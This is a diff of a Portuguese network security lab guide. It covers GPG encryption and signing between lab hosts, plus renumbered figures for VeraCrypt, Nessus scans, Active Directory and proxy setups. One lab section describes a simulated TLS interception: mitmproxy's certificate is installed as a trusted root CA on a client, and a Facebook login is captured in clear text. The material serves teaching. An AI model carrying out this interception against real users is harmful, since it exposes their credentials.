+<div class="paragraph">
+<p>Como não há regra que permita <code>ssh</code> da DMZ para a máquina <em>FWGW1-G</em>, vamos fazer a cópia no sentido inverso:</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>$ hostname
+FWGW1-A</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>$ scp aluno@172.16.1.10:~/bobby_public.asc ~
+bobby_public.asc                                                        100% 3083     3.0KB/s   00:00</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Agora, basta importar e assinar a chave:</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>$ gpg --import bobby_public.asc
+gpg: key 6F4EC30E8E0D7290: public key "Bobby &lt;bobby@seg12.esr.rnp.br&gt;" imported
+gpg: Total number processed: 1
+gpg:               imported: 1</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>$ gpg --edit-key Bobby
+gpg (GnuPG) 2.1.18; Copyright (C) 2017 Free Software Foundation, Inc.
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+
+
+pub  rsa4096/6F4EC30E8E0D7290
+     created: 2018-10-16  expires: never       usage: SC
+     trust: unknown       validity: unknown
+sub  rsa4096/DC5CA71609A03084
+     created: 2018-10-16  expires: never       usage: E
+[ unknown] (1). Bobby &lt;bobby@seg12.esr.rnp.br&gt;</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>gpg&gt; fpr
+pub   rsa4096/6F4EC30E8E0D7290 2018-10-16 Bobby &lt;bobby@seg12.esr.rnp.br&gt;
+ Primary key fingerprint: 89AD 21B9 914F 4E7E 91AA  89D0 6F4E C30E 8E0D 7290</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>gpg&gt; sign
+
+pub  rsa4096/6F4EC30E8E0D7290
+     created: 2018-10-16  expires: never       usage: SC
+     trust: unknown       validity: unknown
+ Primary key fingerprint: 89AD 21B9 914F 4E7E 91AA  89D0 6F4E C30E 8E0D 7290
+
+     Bobby &lt;bobby@seg12.esr.rnp.br&gt;
+
+Are you sure that you want to sign this key with your
+key "Alice &lt;alice@seg12.esr.rnp.br&gt;" (EB757978FB898C57)
+
+Really sign? (y/N) y</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>gpg&gt; quit
+Save changes? (y/N) y</pre>
+</div>
+</div>
 </li>
 <li>
 <p>Agora, vamos fazer o teste de criptografia assimétrica propriamente dito. Na máquina <em>FWGW1-G</em>, verifique que as chaves estão de fato disponíveis. Em seguida, criptografe um documento de texto com conteúdo qualquer com a chave pública de Bobby, envie para a máquina <em>LinServer-G</em>, e tente decriptá-lo usando a chave privada de Bobby.</p>
+<div class="paragraph">
+<p>Na máquina <em>FWGW1-G</em>, vamos verificar se as chaves estão disponíveis:</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>$ hostname
+FWGW1-A</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>$ gpg --list-keys
+gpg: checking the trustdb
+gpg: marginals needed: 3  completes needed: 1  trust model: pgp
+gpg: depth: 0  valid:   1  signed:   1  trust: 0-, 0q, 0n, 0m, 0f, 1u
+gpg: depth: 1  valid:   1  signed:   0  trust: 1-, 0q, 0n, 0m, 0f, 0u
+/home/aluno/.gnupg/pubring.kbx
+------------------------------
+pub   rsa4096 2018-10-16 [SC]
+      5A62CAF74E46B70509335DA7EB757978FB898C57
+uid           [ultimate] Alice &lt;alice@seg12.esr.rnp.br&gt;
+sub   rsa4096 2018-10-16 [E]
+
+pub   rsa4096 2018-10-16 [SC]
+      89AD21B9914F4E7E91AA89D06F4EC30E8E0D7290
+uid           [  full  ] Bobby &lt;bobby@seg12.esr.rnp.br&gt;
+sub   rsa4096 2018-10-16 [E]</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Perfeito. Vamos criar um documento <code>asym.txt</code> com conteúdo qualquer e criptografá-lo com a chave pública de Bobby, e finalmente copiá-lo para a máquina <em>LinServer-G</em>:</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>$ echo 'teste assimetrico' &gt; asym.txt</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>$ gpg -e -r Bobby asym.txt</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>$ ls asym.txt*
+asym.txt  asym.txt.gpg</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>$ scp asym.txt.gpg aluno@172.16.1.10:~
+asym.txt.gpg                                                            100%  614     0.6KB/s   00:00</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Na máquina <em>LinServer-G</em>, vamos tentar decriptar o arquivo com a chave privada de Bobby:</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>$ hostname
+LinServer-A</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>$ ls asym.txt*
+asym.txt.gpg</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>$ gpg -o asym.txt -d asym.txt.gpg
+gpg: encrypted with 4096-bit RSA key, ID DC5CA71609A03084, created 2018-10-16
+      "Bobby &lt;bobby@seg12.esr.rnp.br&gt;"</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>$ cat asym.txt
+teste assimetrico</pre>
+</div>
+</div>
 </li>
 <li>
 <p>Vamos agora testar a assinatura digital de arquivos. Começando a partir da máquina <em>LinServer-G</em>, crie um arquivo texto com conteúdo qualquer. Assine-o com a chave privada de Bobby, e copie o arquivo para a máquina <em>FWGW1-G</em>. Finalmente, verifique a assinatura usando o <em>keyring</em> de Alice.</p>
+<div class="paragraph">
+<p>Na máquina <em>LinServer-G</em>, vamos criar um arquivo com conteúdo qualquer e assiná-lo usando a chave privada de Bobby, em texto claro (opção <code>--clearsign</code>):</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>$ hostname
+LinServer-A</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>$ echo 'teste assinatura' &gt; sign.txt</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>$ gpg --clearsign sign.txt</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>$ ls sign.txt*
+sign.txt      sign.txt.asc</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Note que tanto o conteúdo do arquivo quanto a assinatura estão em texto claro, uma vez que a mensagem foi apenas assinada (e não criptografada).</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>$ cat sign.txt.asc
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA256
+
+teste assinatura
+-----BEGIN PGP SIGNATURE-----
+
+iQIzBAEBCAAdFiEEia0huZFPTn6RqonQb07DDo4NcpAFAlvFs3oACgkQb07DDo4N
+cpB5CA/+JCdrJlc30UbFFuXhaIlK5uu73cc7Cy9pVAz0nZ9QNvQyAxF7EHOlsXM+
+NbohVHQRW3PU5nSKUzcybX/u3to0TJ8T2My4YyzS3xHktDdmoQZCSUqANG0aVpsd
+nuByu7Q0NX+yKETJlsVHskhBs/iQ7TXqxl80FmutfNHeh42EMD3wOajAsWS0YZbh
+YBwp1WGnyPmoEDeC+ijtsaNj2oXTQSQ0c208jeibQZC7v375ZwtU5dcfc+9WuA8G
+uG0eabHeINedQw0OWLDAvHCyC+uKI4Nny6vQYtS4PfDDWtxxl1UYQKyypcCIcwiN
+m5qKcMZED1/cxCWNKtopfbwaL5jPAGu1M+lGXwF1JQqI6o3gjP25w1kUkSXpB83F
+ljwYMzzZjSzk0XP1XRl/t4jTEdbDFIw4hzDMzlAu7ZljdMZ0+pkp73rPiZjvzexd
+z57jGZyYsR2y/VqctICEw8bQOv5OMvwUyCBQ6ucTtkPcsWKlIHZEKXXEKla3V3yD
+476t1ZkHQCquGI2MrOS1JMp3EFlHdkJeJoXrVmlsj5TmvPkvTjZPCPSXkMvgxkJQ
+grzQZcg3BSXpuHRkOvOYQIZXCpoJfMjREjqcqQW0cLEtVutjEYLcVEWglOLm49zS
+P26ADVE+YLgacS4EMIflK6qOELye/PKQrV3LZKEeKaOdrdJT4us=
+=zFNN
+-----END PGP SIGNATURE-----</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Vamos copiar o arquivo para a máquina <em>FWGW1-G</em> (lembrando que a cópia deve ser iniciada no sentido inverso, devido às regras de firewall), e verificar a assinatura.</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>$ hostname
+FWGW1-A</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>$ scp aluno@172.16.1.10:~/sign.txt.asc ~
+sign.txt.asc                                                            100%  883     0.9KB/s   00:00</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>$ gpg --verify sign.txt.asc
+gpg: Signature made ter 16 out 2018 06:46:34 -03
+gpg:                using RSA key 89AD21B9914F4E7E91AA89D06F4EC30E8E0D7290
+gpg: Good signature from "Bobby &lt;bobby@seg12.esr.rnp.br&gt;" [full]</pre>
+</div>
+</div>
 </li>
 <li>
 <p>Finalmente, vamos "juntar tudo". Da máquina <em>FWGW1-G</em>, crie um arquivo texto com conteúdo qualquer e (1) assine-o com a <strong>chave privada de Alice</strong>, e (2) criptografe-o com a <strong>chave pública de Bobby</strong>. Copie o arquivo para a máquina <em>LinServer-G</em>, decripte-o e verifique sua assinatura.</p>
+<div class="paragraph">
+<p>Na máquina <em>FWGW1-G</em>, vamos criar um arquivo com conteúdo qualquer, assiná-lo, criptografá-lo e enviar para a máquina <em>LinServer-G</em>:</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>$ hostname
+FWGW1-A</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>$ echo 'teste assinatura e criptografia assimetrica' &gt; sign-asym.txt</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>$ gpg -s -e -r Bobby sign-asym.txt</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>$ ls sign-asym.txt*
+sign-asym.txt  sign-asym.txt.gpg</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>$ scp sign-asym.txt.gpg aluno@172.16.1.10:~
+sign-asym.txt.gpg                                                       100% 1207     1.2KB/s   00:00</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Agora, na máquina <em>LinServer-G</em>, basta invocar a opção <code>-d</code> do <code>gpg</code>. Além de decriptar o arquivo, sua assinatura será verificada.</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>$ hostname
+LinServer-A</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>$ gpg -o sign-asym.txt -d sign-asym.txt.gpg
+gpg: encrypted with 4096-bit RSA key, ID DC5CA71609A03084, created 2018-10-16
+      "Bobby &lt;bobby@seg12.esr.rnp.br&gt;"
+gpg: Signature made ter 16 out 2018 06:48:13 -03
+gpg:                using RSA key 5A62CAF74E46B70509335DA7EB757978FB898C57
+gpg: checking the trustdb
+gpg: marginals needed: 3  completes needed: 1  trust model: pgp
+gpg: depth: 0  valid:   1  signed:   1  trust: 0-, 0q, 0n, 0m, 0f, 1u
+gpg: depth: 1  valid:   1  signed:   0  trust: 1-, 0q, 0n, 0m, 0f, 0u
+gpg: Good signature from "Alice &lt;alice@seg12.esr.rnp.br&gt;" [full]</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>$ cat sign-asym.txt
+teste assinatura e criptografia assimetrica</pre>
+</div>
+</div>
 </li>
 </ol>
 </div>
@@ -4681,7 +6459,7 @@ iface eth0 inet dhcp</pre>
 <div class="content">
 <img src="./img/thunderbird-addaccount.png" alt="thunderbird addaccount">
 </div>
-<div class="title">Figure 57. Adicionando uma conta de e-mail ao Thunderbird</div>
+<div class="title">Figure 68. Adicionando uma conta de e-mail ao Thunderbird</div>
 </div>
 <div class="paragraph">
 <p>Durante o processo de criação de conta, o <em>Thunderbird</em> irá abrir uma janela para autenticação no GMail, solicitando autorização para integração. Digite a senha da conta definida no passo (1) e garanta as permissões solicitadas.</p>
@@ -4719,7 +6497,7 @@ iface eth0 inet dhcp</pre>
 <div class="content">
 <img src="./img/thunderbird-pep1.png" alt="thunderbird pep1">
 </div>
-<div class="title">Figure 58. PeP habilitado no Thunderbird</div>
+<div class="title">Figure 69. PeP habilitado no Thunderbird</div>
 </div>
 <div class="paragraph">
 <p>Logo abaixo, você visualizará o estado da privacidade como "Inseguro". Isso se deve ao fato de que você e seu colega ainda não fizeram a troca de chaves. O <em>Enigmail/PeP</em> irá se encarregar de anexar sua chave pública automaticamente à mensagem. Envie o email.</p>
@@ -4731,7 +6509,7 @@ iface eth0 inet dhcp</pre>
 <div class="content">
 <img src="./img/thunderbird-pep2.png" alt="thunderbird pep2">
 </div>
-<div class="title">Figure 59. Mensagem segura, não confiável</div>
+<div class="title">Figure 70. Mensagem segura, não confiável</div>
 </div>
 </li>
 <li>
@@ -4740,7 +6518,7 @@ iface eth0 inet dhcp</pre>
 <div class="content">
 <img src="./img/thunderbird-pep3.png" alt="thunderbird pep3">
 </div>
-<div class="title">Figure 60. Verificação de palavras confiáveis</div>
+<div class="title">Figure 71. Verificação de palavras confiáveis</div>
 </div>
 <div class="paragraph">
 <p>Serão mostradas cinco palavras confiáveis, que devem ser confirmadas com o seu colega. Se corretas, significa que a chave pública anexada à mensagem original é, de fato, correspondente à chave privada sob posso do seu colega. Clique no botão <em>Confirme palavras-confiáveis</em> para autenticar a chave.</p>
@@ -4752,7 +6530,7 @@ iface eth0 inet dhcp</pre>
 <div class="content">
 <img src="./img/thunderbird-pep4.png" alt="thunderbird pep4">
 </div>
-<div class="title">Figure 61. Mensagem segura e confiável</div>
+<div class="title">Figure 72. Mensagem segura e confiável</div>
 </div>
 <div class="paragraph">
 <p>A partir desse momento, a chave pública do seu colega é conhecida pelo <em>Enigmail/PeP</em>, e é possível enviar mensagens criptografadas para ele e verificar mensagens assinadas. Envie um email-resposta para a mensagem original, e repita os passos (8) e (9) para autenticar a chave no sentido oposto. A partir desse momento, será possível trocar mensagens seguras entre as duas partes.</p>
@@ -4788,7 +6566,7 @@ iface eth0 inet dhcp</pre>
 <div class="content">
 <img src="./img/veracrypt1.png" alt="veracrypt1">
 </div>
-<div class="title">Figure 62. Criação de volumes no VeraCrypt, parte 1</div>
+<div class="title">Figure 73. Criação de volumes no VeraCrypt, parte 1</div>
 </div>
 </li>
 <li>
@@ -4797,7 +6575,7 @@ iface eth0 inet dhcp</pre>
 <div class="content">
 <img src="./img/veracrypt2.png" alt="veracrypt2">
 </div>
-<div class="title">Figure 63. Criação de volumes no VeraCrypt, parte 2</div>
+<div class="title">Figure 74. Criação de volumes no VeraCrypt, parte 2</div>
 </div>
 </li>
 <li>
@@ -4809,7 +6587,7 @@ iface eth0 inet dhcp</pre>
 <div class="content">
 <img src="./img/veracrypt3.png" alt="veracrypt3">
 </div>
-<div class="title">Figure 64. Criação de volumes no VeraCrypt, parte 3</div>
+<div class="title">Figure 75. Criação de volumes no VeraCrypt, parte 3</div>
 </div>
 </li>
 <li>
@@ -4830,7 +6608,7 @@ iface eth0 inet dhcp</pre>
 <div class="content">
 <img src="./img/veracrypt4.png" alt="veracrypt4">
 </div>
-<div class="title">Figure 65. Criação de volumes no VeraCrypt, parte 4</div>
+<div class="title">Figure 76. Criação de volumes no VeraCrypt, parte 4</div>
 </div>
 </li>
 <li>
@@ -5173,7 +6951,7 @@ rtt min/avg/max/mdev = 0.451/0.451/0.451/0.000 ms</pre>
 <div class="content">
 <img src="./img/mitmproxy-dlcert.png" alt="mitmproxy dlcert">
 </div>
-<div class="title">Figure 66. Download do certificado do mitmproxy</div>
+<div class="title">Figure 77. Download do certificado do mitmproxy</div>
 </div>
 </li>
 <li>
@@ -5182,7 +6960,7 @@ rtt min/avg/max/mdev = 0.451/0.451/0.451/0.000 ms</pre>
 <div class="content">
 <img src="./img/mitmproxy-instcert1.png" alt="mitmproxy instcert1">
 </div>
-<div class="title">Figure 67. Instalação do certificado do mitmproxy, parte 1</div>
+<div class="title">Figure 78. Instalação do certificado do mitmproxy, parte 1</div>
 </div>
 <div class="paragraph">
 <p>Clique em <em>Avançar</em>. Em seguida, marque a caixa <em>Colocar todos os certificados no repositório a seguir</em>, clique em <em>Procurar&#8230;&#8203;</em> e selecione <em>Autoridades de Certificação Raiz Confiáveis</em>.</p>
@@ -5191,7 +6969,7 @@ rtt min/avg/max/mdev = 0.451/0.451/0.451/0.000 ms</pre>
 <div class="content">
 <img src="./img/mitmproxy-instcert2.png" alt="mitmproxy instcert2">
 </div>
-<div class="title">Figure 68. Instalação do certificado do mitmproxy, parte 2</div>
+<div class="title">Figure 79. Instalação do certificado do mitmproxy, parte 2</div>
 </div>
 <div class="paragraph">
 <p>Finalmente, clique em <em>Avançar</em> e em seguida em <em>Concluir</em>. Agora, o certificado do <code>mitmproxy</code> é reconhecido como um AC Raiz pelo sistema Windows. Num cenário real, o atacante teria que descobrir algum vetor de ataque <em>client-side</em> que permitisse a ele ter o acesso para copiar o certificado e instalá-lo na máquina da vítima. Aqui, como estamos em um ambiente simulado, pudemos contar com a "colaboração" do usuário-alvo.</p>
@@ -5241,7 +7019,7 @@ rtt min/avg/max/mdev = 0.451/0.451/0.451/0.000 ms</pre>
 <div class="content">
 <img src="./img/mitmproxy-password.png" alt="mitmproxy password">
 </div>
-<div class="title">Figure 69. Credenciais em claro no mitmweb</div>
+<div class="title">Figure 80. Credenciais em claro no mitmweb</div>
 </div>
 <div class="paragraph">
 <p>Em parelelo, na janela do navegador na máquina <em>WinClient-G</em>, o login no Facebook é concluído com sucesso:</p>
@@ -5250,7 +7028,7 @@ rtt min/avg/max/mdev = 0.451/0.451/0.451/0.000 ms</pre>
 <div class="content">
 <img src="./img/mitmproxy-fblogin.png" alt="mitmproxy fblogin">
 </div>
-<div class="title">Figure 70. Login no facebook através do mitmproxy</div>
+<div class="title">Figure 81. Login no facebook através do mitmproxy</div>
 </div>
 </li>
 <li>
@@ -5503,7 +7281,7 @@ refresh_pattern .                    0  20%    4320</code></pre>
 <div class="content">
 <img src="./img/squid-bump.png" alt="squid bump">
 </div>
-<div class="title">Figure 71. Acesso via Squid/Bump a <a href="https://twitter.com" class="bare">https://twitter.com</a></div>
+<div class="title">Figure 82. Acesso via Squid/Bump a <a href="https://twitter.com" class="bare">https://twitter.com</a></div>
 </div>
 <div class="paragraph">
 <p>Agora, acesse um dos websites cujo domínio consta no arquivo <code>/usr/local/etc/whitelist.txt</code>, e verifique sua cadeia certificadora: a AC que assina o certificado será a original, inalterada pelo proxy. Veja abaixo um acesso a <a href="https://www.bb.com.br" class="bare">https://www.bb.com.br</a> :</p>
@@ -5512,7 +7290,7 @@ refresh_pattern .                    0  20%    4320</code></pre>
 <div class="content">
 <img src="./img/squid-splice.png" alt="squid splice">
 </div>
-<div class="title">Figure 72. Acesso via Squid/Splice a <a href="https://www.bb.com.br" class="bare">https://www.bb.com.br</a></div>
+<div class="title">Figure 83. Acesso via Squid/Splice a <a href="https://www.bb.com.br" class="bare">https://www.bb.com.br</a></div>
 </div>
 </li>
 <li>
@@ -5929,7 +7707,7 @@ reneg-sec 60</code></pre>
 <div class="content">
 <img src="./img/ovpn-folder.png" alt="ovpn folder">
 </div>
-<div class="title">Figure 73. Estado final da pasta do OpenVPN na máquina WinClient-G</div>
+<div class="title">Figure 84. Estado final da pasta do OpenVPN na máquina WinClient-G</div>
 </div>
 </li>
 <li>
@@ -6397,7 +8175,7 @@ Processing triggers for systemd (238-4) ...</pre>
 <div class="content">
 <img src="./img/nessus-console.png" alt="nessus console">
 </div>
-<div class="title">Figure 74. Console do Nessus</div>
+<div class="title">Figure 85. Console do Nessus</div>
 </div>
 </li>
 </ol>
@@ -6499,7 +8277,7 @@ Processing triggers for systemd (238-4) ...</pre>
 <div class="content">
 <img src="./img/nessus-linserver1.png" alt="nessus linserver1">
 </div>
-<div class="title">Figure 75. Scan inicial do LinServer-G-Debian8 no Nessus</div>
+<div class="title">Figure 86. Scan inicial do LinServer-G-Debian8 no Nessus</div>
 </div>
 <div class="paragraph">
 <p>Aguarde o final do <em>scan</em>, e confira o resultado. Se quiser acompanhar o <em>scan</em> enquanto ele é realizado, clique na linha para expandi-la.</p>
@@ -6511,7 +8289,7 @@ Processing triggers for systemd (238-4) ...</pre>
 <div class="content">
 <img src="./img/nessus-linserver2.png" alt="nessus linserver2">
 </div>
-<div class="title">Figure 76. Primeiro scan do LinServer-G-Debian8 no Nessus</div>
+<div class="title">Figure 87. Primeiro scan do LinServer-G-Debian8 no Nessus</div>
 </div>
 <div class="paragraph">
 <p>Veja que há um grande número de vulnerabilidades identificadas: 6 críticas, 43 de alto impacto, 34 de médio impacto, 4 de baixo impacto e 48 de cunho informativo. Entre na aba <em>Vulnerabilities</em> e explore algumas dessas vulnerabilidades&#8201;&#8212;&#8201;por exemplo, confira abaixo a vulnerabilidade DSA-3481-1, referente à <code>glibc</code>:</p>
@@ -6520,7 +8298,7 @@ Processing triggers for systemd (238-4) ...</pre>
 <div class="content">
 <img src="./img/nessus-linserver3.png" alt="nessus linserver3">
 </div>
-<div class="title">Figure 77. Vulnerabilidade crítica da glibc</div>
+<div class="title">Figure 88. Vulnerabilidade crítica da glibc</div>
 </div>
 <div class="paragraph">
 <p>O Nessus apresenta várias informações úteis, como a natureza da vulnerabilidade, quais CVEs (<em>Common Vulnerabilities and Exposures</em>) são relevantes, e quais são as soluções mais indicadas. Do ponto de vista de gestão de riscos e vulnerabilidades em um parque com um grande número de máquinas instaladas, essas informações são importantíssimas.</p>
@@ -6556,7 +8334,7 @@ LinServer-A</pre>
 <div class="content">
 <img src="./img/nessus-linserver4.png" alt="nessus linserver4">
 </div>
-<div class="title">Figure 78. Scan do LinServer-G-Debian8 após atualização</div>
+<div class="title">Figure 89. Scan do LinServer-G-Debian8 após atualização</div>
 </div>
 <div class="paragraph">
 <p>Temos uma melhora notável: apenas 1 vulnerabilidade crítica e 3 de alto impacto foram identificadas, um cenário muito menos preocupante que o que tínhamos anteriormente.</p>
@@ -6641,7 +8419,7 @@ LinServer-A</pre>
 <div class="content">
 <img src="./img/nessus-winserver1.png" alt="nessus winserver1">
 </div>
-<div class="title">Figure 79. Primeiro scan do WinServer-G no Nessus</div>
+<div class="title">Figure 90. Primeiro scan do WinServer-G no Nessus</div>
 </div>
 <div class="paragraph">
 <p>Veja que há um enorme número de vulnerabilidades identificadas: 25 críticas, 327 de alto impacto, 81 de médio impacto, 7 de baixo impacto e 159 de cunho informativo. Entre na aba <em>Vulnerabilities</em> e explore algumas dessas vulnerabilidades.</p>
@@ -6656,7 +8434,7 @@ LinServer-A</pre>
 <div class="content">
 <img src="./img/nessus-winserver2.png" alt="nessus winserver2">
 </div>
-<div class="title">Figure 80. Scan do MBSA na máquina WinServer-G</div>
+<div class="title">Figure 91. Scan do MBSA na máquina WinServer-G</div>
 </div>
 <div class="paragraph">
 <p>Após o final do <em>scan</em>, vários apontamentos serão indicados pelo MBSA, como se segue:</p>
@@ -6665,7 +8443,7 @@ LinServer-A</pre>
 <div class="content">
 <img src="./img/nessus-winserver3.png" alt="nessus winserver3">
 </div>
-<div class="title">Figure 81. Resultados do scan do MBSA na máquina WinServer-G</div>
+<div class="title">Figure 92. Resultados do scan do MBSA na máquina WinServer-G</div>
 </div>
 <div class="paragraph">
 <p>Desses, o mais preocupante é de longe o grande número de atualizações de segurança pendentes: 205. Ainda há alertas quanto à falta de atualizações automáticas, expiração de senhas de usuários e situação do <em>Windows Firewall</em>.</p>
@@ -6677,7 +8455,7 @@ LinServer-A</pre>
 <div class="content">
 <img src="./img/nessus-winserver4.png" alt="nessus winserver4">
 </div>
-<div class="title">Figure 82. WinServer-G atualizado</div>
+<div class="title">Figure 93. WinServer-G atualizado</div>
 </div>
 <div class="paragraph">
 <p>Após o final do processo, a tela do <em>Windows Update</em> deve mostrar a mensagem acima.</p>
@@ -6689,7 +8467,7 @@ LinServer-A</pre>
 <div class="content">
 <img src="./img/nessus-winserver5.png" alt="nessus winserver5">
 </div>
-<div class="title">Figure 83. Scan final do WinServer-G no Nessus</div>
+<div class="title">Figure 94. Scan final do WinServer-G no Nessus</div>
 </div>
 <div class="paragraph">
 <p>A diferença para o panorama anterior é significativa: agora temos apenas 7 vulnerabilidades de médio impacto, 2 de baixo impacto e 27 de cunho informativo. De fato, as recomendações do MBSA e as atualizações de sistema fizeram uma diferença importante na segurança do sistema.</p>
@@ -6774,7 +8552,7 @@ LinServer-A</pre>
 <div class="content">
 <img src="./img/nessus-fwgw1.png" alt="nessus fwgw1">
 </div>
-<div class="title">Figure 84. Primeiro scan do FWGW1-G-Debian8 no Nessus</div>
+<div class="title">Figure 95. Primeiro scan do FWGW1-G-Debian8 no Nessus</div>
 </div>
 <div class="paragraph">
 <p>Um resultado impressionante: apenas 6 vulnerabilidades informativas. Mas, será mesmo?</p>
@@ -6817,7 +8595,7 @@ Chain OUTPUT (policy ACCEPT 20 packets, 1568 bytes)
 <div class="content">
 <img src="./img/nessus-fwgw2.png" alt="nessus fwgw2">
 </div>
-<div class="title">Figure 85. Segundo scan do FWGW1-G-Debian8 no Nessus</div>
+<div class="title">Figure 96. Segundo scan do FWGW1-G-Debian8 no Nessus</div>
 </div>
 <div class="paragraph">
 <p>Agora temos uma vulnerabilidade de alto impacto, duas de médio impacto e 23 informativas. Talvez o servidor não esteja tão seguro quando imaginávamos&#8230;&#8203; vamos tentar ir mais a fundo.</p>
@@ -6861,7 +8639,7 @@ Chain OUTPUT (policy ACCEPT 20 packets, 1568 bytes)
 <div class="content">
 <img src="./img/nessus-fwgw3.png" alt="nessus fwgw3">
 </div>
-<div class="title">Figure 86. Scan final do FWGW1-G-Debian8 no Nessus</div>
+<div class="title">Figure 97. Scan final do FWGW1-G-Debian8 no Nessus</div>
 </div>
 <div class="paragraph">
 <p>Com o login <code>ssh</code> ativado, o Nessus conseguiu, agora sim, encontrar 6 vulnerabilidades críticas, 44 de alto impacto, 36 de médio impacto, 4 de baixo impacto e 54 informativas. De fato, a segurança do servidor <em>FWGW1-G-Debian8</em> está no mesmo patamar da máquina <em>LinServer-G-Debian8</em> antes da sua atualização, o que seria esperado.</p>
@@ -6994,7 +8772,7 @@ Chain OUTPUT (policy ACCEPT 20 packets, 1568 bytes)
 <div class="content">
 <img src="./img/ad1.png" alt="ad1">
 </div>
-<div class="title">Figure 87. Tela inicial de configuração do AD DC</div>
+<div class="title">Figure 98. Tela inicial de configuração do AD DC</div>
 </div>
 <div class="paragraph">
 <p>Marque a opção <em>Use advanced mode installation</em> e clique em <em>Next</em>.</p>
@@ -7009,7 +8787,7 @@ Chain OUTPUT (policy ACCEPT 20 packets, 1568 bytes)
 <div class="content">
 <img src="./img/ad2.png" alt="ad2">
 </div>
-<div class="title">Figure 88. Escolha de tipo de instalação do AD DC</div>
+<div class="title">Figure 99. Escolha de tipo de instalação do AD DC</div>
 </div>
 <div style="page-break-after: always;"></div>
 </li>
@@ -7019,7 +8797,7 @@ Chain OUTPUT (policy ACCEPT 20 packets, 1568 bytes)
 <div class="content">
 <img src="./img/ad3.png" alt="ad3">
 </div>
-<div class="title">Figure 89. Escolha do FQDN do AD DC</div>
+<div class="title">Figure 100. Escolha do FQDN do AD DC</div>
 </div>
 </li>
 <li>
@@ -7032,7 +8810,7 @@ Chain OUTPUT (policy ACCEPT 20 packets, 1568 bytes)
 <div class="content">
 <img src="./img/ad4.png" alt="ad4">
 </div>
-<div class="title">Figure 90. Escolha do nível funcional da floresta AD DC</div>
+<div class="title">Figure 101. Escolha do nível funcional da floresta AD DC</div>
 </div>
 <div style="page-break-after: always;"></div>
 </li>
@@ -7045,7 +8823,7 @@ Chain OUTPUT (policy ACCEPT 20 packets, 1568 bytes)
 <div class="content">
 <img src="./img/ad5.png" alt="ad5">
 </div>
-<div class="title">Figure 91. Erro na delegação DNS do AD DC</div>
+<div class="title">Figure 102. Erro na delegação DNS do AD DC</div>
 </div>
 <div class="paragraph">
 <p>Após ler a mensagem de aviso, clique em <em>Yes</em> para continuar.</p>
@@ -7061,7 +8839,7 @@ Chain OUTPUT (policy ACCEPT 20 packets, 1568 bytes)
 <div class="content">
 <img src="./img/ad6.png" alt="ad6">
 </div>
-<div class="title">Figure 92. Definição da senha do modo de recuperação do AD DC</div>
+<div class="title">Figure 103. Definição da senha do modo de recuperação do AD DC</div>
 </div>
 </li>
 <li>
@@ -7119,7 +8897,7 @@ Chain OUTPUT (policy ACCEPT 20 packets, 1568 bytes)
 <div class="content">
 <img src="./img/adports.png" alt="adports">
 </div>
-<div class="title">Figure 93. Portas conhecidas para liberação do AD no firewall</div>
+<div class="title">Figure 104. Portas conhecidas para liberação do AD no firewall</div>
 </div>
 <div class="paragraph">
 <p>Considerando o grande número de portas em questão, iremos permitir a faixa completa de conexão entre as máquinas <em>WinServer-G</em> e <em>WinClient-G</em>, para facilitar a configuração neste laboratório.</p>
@@ -7168,7 +8946,7 @@ root</pre>
 <div class="content">
 <img src="./img/adclient1.png" alt="adclient1">
 </div>
-<div class="title">Figure 94. Configuração DNS do cliente AD</div>
+<div class="title">Figure 105. Configuração DNS do cliente AD</div>
 </div>
 </li>
 <li>
@@ -7177,7 +8955,7 @@ root</pre>
 <div class="content">
 <img src="./img/adclient2.png" alt="adclient2">
 </div>
-<div class="title">Figure 95. Inserindo o cliente AD no domínio</div>
+<div class="title">Figure 106. Inserindo o cliente AD no domínio</div>
 </div>
 <div class="paragraph">
